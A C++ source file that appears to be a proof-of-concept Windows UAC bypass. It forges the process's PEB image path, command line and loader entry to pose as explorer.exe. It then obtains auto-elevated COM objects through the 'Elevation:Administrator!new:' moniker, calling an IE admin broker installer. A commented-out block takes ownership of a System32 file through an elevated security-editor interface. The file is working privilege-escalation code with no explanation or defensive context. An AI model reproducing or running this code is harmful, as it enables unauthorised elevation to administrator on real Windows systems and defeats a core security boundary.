#include <Windows.h>
#include <ShlObj.h>
#include <ShObjIdl.h>
#include <iostream>
#include <string>
#include <sddl.h>

#pragma region NT Stuff
typedef struct _UNICODE_STRING
{
	unsigned short Length;
	unsigned short MaximumLength;
	long Padding_8;
	wchar_t* Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _CURDIR
{
	struct _UNICODE_STRING DosPath;
	void* Handle;
} CURDIR, * PCURDIR;

typedef struct _STRING
{
	unsigned short Length;
	unsigned short MaximumLength;
	long Padding_94;
	char* Buffer;
} STRING, * PSTRING;

typedef struct _RTL_DRIVE_LETTER_CURDIR
{
	unsigned short Flags;
	unsigned short Length;
	unsigned long TimeStamp;
	struct _STRING DosPath;
} RTL_DRIVE_LETTER_CURDIR, * PRTL_DRIVE_LETTER_CURDIR;

typedef struct _RTL_USER_PROCESS_PARAMETERS
{
	unsigned long MaximumLength;
	unsigned long Length;
	unsigned long Flags;
	unsigned long DebugFlags;
	void* ConsoleHandle;
	unsigned long ConsoleFlags;
	long Padding_95;
	void* StandardInput;
	void* StandardOutput;
	void* StandardError;
	struct _CURDIR CurrentDirectory;
	struct _UNICODE_STRING DllPath;
	struct _UNICODE_STRING ImagePathName;
	struct _UNICODE_STRING CommandLine;
	void* Environment;
	unsigned long StartingX;
	unsigned long StartingY;
	unsigned long CountX;
	unsigned long CountY;
	unsigned long CountCharsX;
	unsigned long CountCharsY;
	unsigned long FillAttribute;
	unsigned long WindowFlags;
	unsigned long ShowWindowFlags;
	long Padding_96;
	struct _UNICODE_STRING WindowTitle;
	struct _UNICODE_STRING DesktopInfo;
	struct _UNICODE_STRING ShellInfo;
	struct _UNICODE_STRING RuntimeData;
	struct _RTL_DRIVE_LETTER_CURDIR CurrentDirectores[32];
	unsigned __int64 EnvironmentSize;
	unsigned __int64 EnvironmentVersion;
	void* PackageDependencyData;
	unsigned long ProcessGroupId;
	unsigned long LoaderThreads;
	struct _UNICODE_STRING RedirectionDllName;
	struct _UNICODE_STRING HeapPartitionName;
	unsigned __int64* DefaultThreadpoolCpuSetMasks;
	unsigned long DefaultThreadpoolCpuSetMaskCount;
	long __PADDING__[1];
} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

constexpr auto PEB_OFFSET = 0x60ULL;
constexpr auto PROCESS_PARAM_OFFSET = 0x20ULL;
constexpr auto BASENAME_OFFSET = 0x58ULL;
constexpr auto FULLNAME_OFFSET = 0x48ULL;
constexpr auto DLL_BASE_OFFSET = 0x30ULL;
#pragma endregion

using RtlInitUnicodeStringPtr = void(NTAPI*)(PUNICODE_STRING, PCWSTR);
using LDR_ENUM_CALLBACK = void(NTAPI*)(PVOID, PVOID, PBOOLEAN);
using LdrEnumerateLoadedModulesPtr = NTSTATUS(NTAPI*)(ULONG, LDR_ENUM_CALLBACK, PVOID);

struct LDR_CALLBACK_PARAMS
{
	PCWCHAR ExplorerPath;
	PVOID ImageBase;
	RtlInitUnicodeStringPtr RtlInitUnicodeString;
};

void ForgeProcessInformation(const PCWCHAR explorerPath, const RtlInitUnicodeStringPtr RtlInitUnicodeString,
	const LdrEnumerateLoadedModulesPtr LdrEnumerateLoadedModules)
{
	const auto pPeb = *reinterpret_cast<PBYTE*>(reinterpret_cast<PBYTE>(NtCurrentTeb()) + PEB_OFFSET);
	auto pProcessParams = *reinterpret_cast<PRTL_USER_PROCESS_PARAMETERS*>(pPeb + PROCESS_PARAM_OFFSET);

	RtlInitUnicodeString(&pProcessParams->ImagePathName, explorerPath);
	RtlInitUnicodeString(&pProcessParams->CommandLine, L"explorer.exe");

	LDR_CALLBACK_PARAMS params{ explorerPath, GetModuleHandleW(nullptr), RtlInitUnicodeString };

	LdrEnumerateLoadedModules(0, [](PVOID ldrEntry, PVOID context, PBOOLEAN stop)
		{
			auto* params = static_cast<LDR_CALLBACK_PARAMS*>(context);

			if (*reinterpret_cast<PULONG_PTR>(reinterpret_cast<ULONG_PTR>(ldrEntry) + DLL_BASE_OFFSET) == reinterpret_cast<
				ULONG_PTR>(params->ImageBase))
			{
				const auto baseName = reinterpret_cast<PUNICODE_STRING>(static_cast<PBYTE>(ldrEntry) + BASENAME_OFFSET),
					fullName = reinterpret_cast<PUNICODE_STRING>(static_cast<PBYTE>(ldrEntry) + FULLNAME_OFFSET);

				params->RtlInitUnicodeString(baseName, L"explorer.exe");
				params->RtlInitUnicodeString(fullName, params->ExplorerPath);

				*stop = TRUE;
			}
		}, reinterpret_cast<PVOID>(&params));
}


int main()
{
	auto RtlInitUnicodeString = reinterpret_cast<RtlInitUnicodeStringPtr>(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlInitUnicodeString"));
	auto LdrEnumerateLoadedModules = reinterpret_cast<LdrEnumerateLoadedModulesPtr>(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "LdrEnumerateLoadedModules"));

	ForgeProcessInformation(L"C:\\Windows\\explorer.exe", RtlInitUnicodeString, LdrEnumerateLoadedModules);

	BIND_OPTS3 bind{};
	bind.cbStruct = sizeof(BIND_OPTS3);
	bind.dwClassContext = CLSCTX_LOCAL_SERVER;

	//	// {88DFAF5A-9C49-454A-AE9F-84A234045DEE}
	//	static const GUID IID_IFaxUtilityCommon = {
	//		0x4A4EBE8E,
	//		0x0AE27,
	//		0x4AA3,{
	//		0x0B7, 0x2, 0x0F3, 0x65, 0x0C4, 0x0A9, 0x0F, 0x0AC} };
	//
	//	static const GUID IID_ISecurityEditor = { 0x14B2C619, 0xD07A, 0x46EF, {0x8B, 0x62, 0x31, 0xB6, 0x4F, 0x3B, 0x84, 0x5C }
	//};
	//struct IFaxCommon
	//{
	//	virtual HRESULT QueryInterface(REFIID, void**) = 0;
	//	virtual ULONG AddRef() = 0;
	//	virtual ULONG Release() = 0;
	//	virtual __int64 LaunchFaxConfigUI(HWND) = 0;
	//	virtual int SendMessageToFirstWFSInstance(int, PCWSTR, UINT, __int64, __int64, PCWSTR) = 0;
	//	virtual int SetReceiveMode(__int16*, int) = 0;
	//	virtual int LaunchModemInstallationWizard(HWND) = 0;
	//	virtual __int64 RestartLocalFaxService() = 0;
	//};
	typedef enum _SE_OBJECT_TYPE
	{
		SE_UNKNOWN_OBJECT_TYPE = 0,
		SE_FILE_OBJECT,
		SE_SERVICE,
		SE_PRINTER,
		SE_REGISTRY_KEY,
		SE_LMSHARE,
		SE_KERNEL_OBJECT,
		SE_WINDOW_OBJECT,
		SE_DS_OBJECT,
		SE_DS_OBJECT_ALL,
		SE_PROVIDER_DEFINED_OBJECT,
		SE_WMIGUID_OBJECT,
		SE_REGISTRY_WOW64_32KEY,
		SE_REGISTRY_WOW64_64KEY,
	} SE_OBJECT_TYPE;
	struct ISecurityEditor {

		virtual HRESULT QueryInterface(
			__RPC__in REFIID riid,
			_COM_Outptr_  void** ppvObject) = 0;

		virtual ULONG AddRef(
		) = 0;

		virtual ULONG Release() = 0;

		virtual HRESULT GetSecurity(
			_In_ LPCOLESTR ObjectName,
			_In_ SE_OBJECT_TYPE ObjectType,
			_In_ SECURITY_INFORMATION SecurityInfo,
			_Out_opt_ LPCOLESTR* ppSDDLStr) = 0;

		virtual HRESULT SetSecurity(
			_In_ LPCOLESTR ObjectName,
			_In_ SE_OBJECT_TYPE ObjectType,
			_In_ SECURITY_INFORMATION SecurityInfo,
			_In_ LPCOLESTR ppSDDLStr) = 0;
	};

	/*CoInitializeEx(0, COINIT_APARTMENTTHREADED);

	//IFaxCommon* ppv;
	//ISecurityEditor* editor;

	//CoGetObject(L"Elevation:Administrator!new:{59347292-B72D-41F2-98C5-E9ACA1B247A2}", &bind, IID_IFaxUtilityCommon, (void**)&ppv);
	//CoGetObject(L"Elevation:Administrator!new:{4D111E08-CBF7-4f12-A926-2C7920AF52FC}", &bind, IID_ISecurityEditor, (void**)&editor);

	//LPCOLESTR str;

	//editor->GetSecurity(L"C:\\Windows\\System32\\hdwwiz.cpl", SE_FILE_OBJECT, OWNER_SECURITY_INFORMATION, &str);
	//std::wcout << str << std::endl;
	//CoTaskMemFree((LPVOID)str);
	//PTOKEN_USER info;
	//DWORD len;

	//GetTokenInformation(GetCurrentProcessToken(), TokenUser, nullptr, 0, &len);

	//info = (PTOKEN_USER)malloc(len);

	//GetTokenInformation(GetCurrentProcessToken(), TokenUser, info, len, &len);

	//LPWSTR stringSid;

	//ConvertSidToStringSidW(info->User.Sid, &stringSid);

	//auto res = editor->SetSecurity(L"C:\\Windows\\System32\\hdwwiz.cpl", SE_FILE_OBJECT, OWNER_SECURITY_INFORMATION, L"O:S-1-5-21-3340512567-2616568518-976464959-1001");


	//LocalFree(stringSid);
	//free(info);
	ppv->LaunchModemInstallationWizard(0);
	ppv->Release();
	//editor->Release();
	CoUninitialize();*/

	static const GUID IID_IeAxiInstaller2 =
	{ 0x0BC0EC710, 0x0A3ED, 0x4F99, {0x0B1, 0x4F, 0x5F, 0x0D5, 0x9F, 0x0DA, 0x0CE, 0x0A3} };
	static const GUID IID_IeAxiAdminInstaller =
	{ 0x9AEA8A59, 0x0E0C9, 0x40F1, {0x87, 0x0DD, 0x75, 0x70, 0x61, 0x0D5, 0x61, 0x77} };

	struct IIEAdminBrokerObjectAdminInstaller : IUnknown
	{
		virtual HRESULT InitializeAdminInstaller(
			PCWSTR Name, int Unknown0, PWSTR* Uuid
		) = 0;
	};

	struct IIEAdminBrokerObjectInstaller2 : IUnknown
	{
		virtual HRESULT VerifyFile(
			PCWSTR, HWND__*, PCWSTR, PCWSTR, PCWSTR, ULONG, ULONG, _GUID const&, PCWSTR*, PULONG, PUCHAR*
		) = 0;
		virtual HRESULT RunSetupCommand() = 0;
		/*virtual HRESULT InstallFile() = 0;
		virtual HRESULT RegisterExeFile() = 0;
		virtual HRESULT RegisterDllFile() = 0;
		virtual HRESULT InstallCatalogFile() = 0;
		virtual HRESULT UpdateLanguageCheck() = 0;
		virtual HRESULT UpdateDistributionUnit() = 0;
		virtual HRESULT UpdateModuleUsage() = 0;
		virtual HRESULT EnumerateFiles() = 0;
		virtual HRESULT ExtractFiles() = 0;
		virtual HRESULT RemoveExtractedFilesAndDirs() = 0;
		virtual HRESULT CreateExtensionsManager() = 0;
		virtual HRESULT RegisterDllFile2() = 0;
		virtual HRESULT UpdateDistributionUnit2() = 0;*/
	};

	IIEAdminBrokerObjectAdminInstaller* adminInstaller;
	IIEAdminBrokerObjectInstaller2* installer;
	PWSTR uuid;

	HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);

	hr = CoGetObject(L"Elevation:Administrator!new:{BDB57FF2-79B9-4205-9447-F5FE85F37312}", &bind, IID_IeAxiAdminInstaller, (void**)&adminInstaller);

	hr = adminInstaller->InitializeAdminInstaller(0, 0, &uuid);
	hr = adminInstaller->QueryInterface(IID_IeAxiInstaller2, (void**)&installer);

	PCWSTR name{ 0 };
	void* ptr;
	PCWSTR d;
	PUCHAR a;
	ULONG p{ 0 };

	hr = installer->VerifyFile(uuid, 0, L"C:\\Windows\\notepad.exe", L"C:\\Windows\\notepad.exe", L"C:\\Windows\\notepad.exe", 0, 0, IID_IUnknown, &d, &p, &a);

	installer->Release();
	adminInstaller->Release();
	CoUninitialize();
}